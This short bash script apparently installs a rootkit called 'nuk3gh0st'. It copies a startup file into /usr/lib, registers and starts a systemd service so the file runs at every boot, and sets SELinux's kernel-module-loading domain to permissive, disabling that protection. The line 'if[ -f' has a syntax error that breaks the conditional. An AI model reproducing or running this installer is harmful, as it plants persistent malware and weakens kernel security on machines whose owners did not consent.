#!/bin/bash
cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
chmod +x /usr/lib/nuk3gh0st.startup
cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
if[ -f /usr/sbin/semanage ]; then
	semanage permissive -a insmod_t
fi
systemctl enable nuk3gh0st.service
service nuk3gh0st start
